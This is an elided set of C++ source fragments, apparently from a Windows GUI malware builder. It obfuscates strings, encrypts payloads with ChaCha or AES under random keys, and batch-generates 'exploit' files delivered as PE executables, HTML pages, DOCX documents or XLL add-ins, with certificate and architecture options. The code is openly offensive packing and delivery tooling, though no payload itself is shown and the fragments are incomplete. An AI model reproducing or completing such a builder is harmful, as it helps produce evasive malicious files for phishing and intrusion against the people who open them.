...
public:
    ...
    ObfuscatedString obfuscateString(const std::string& input) {
        ...
        std::uniform_int_distribution<uint8_t> keyDis(1, 255);
        result.key = keyDis(gen);
...
public:
    ...
    ChaChaData encrypt(const std::vector<uint8_t>& data) {
        ...
        std::uniform_int_distribution<uint8_t> byteDis(0, 255);
        result.key.resize(32);
        result.nonce.resize(12);
        
        for(int i = 0; i < 32; i++) result.key[i] = byteDis(gen);
        for(int i = 0; i < 12; i++) result.nonce[i] = byteDis(gen);
...
public:
    ...
    AESData encrypt(const std::vector<uint8_t>& data) {
        ...
        for(int i = 0; i < 32; i++) result.key[i] = byteDis(gen);
        for(int i = 0; i < 16; i++) result.iv[i] = byteDis(gen);
...
private:
    ...
    std::string generateSmartFilename(MultiVectorExploitGenerator::DeliveryVector deliveryType, int index) {
        ...
        filename << prefix << "_" << time_t << "_" << ms.count() << "_" << index << extension;
...
void createExploit() {
    ...
    int certIdx = SendMessage(hCertCombo, CB_GETCURSEL, 0, 0);
    int archIdx = SendMessage(hArchCombo, CB_GETCURSEL, 0, 0);
    int encIdx = SendMessage(hEncryptionCombo, CB_GETCURSEL, 0, 0);
    int delIdx = SendMessage(hDeliveryCombo, CB_GETCURSEL, 0, 0);
    ...
    int batchCount = std::max(1, atoi(batchCountText));
    ...
    // Set delivery type
    switch(delIdx) {
        case 0: config.deliveryType = MultiVectorExploitGenerator::PE_EXECUTABLE; break;
        case 1: config.deliveryType = MultiVectorExploitGenerator::HTML_EXPLOIT; break;
        case 2: config.deliveryType = MultiVectorExploitGenerator::DOCX_EXPLOIT; break;
        case 3: config.deliveryType = MultiVectorExploitGenerator::XLL_EXPLOIT; break;
        default: config.deliveryType = MultiVectorExploitGenerator::PE_EXECUTABLE; break;
    }
    
    // Generate in separate thread
    std::thread([config, packer]() mutable {
...
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            ...
            hProgressBar = CreateWindowA(PROGRESS_CLASS, NULL, WS_VISIBLE | WS_CHILD,
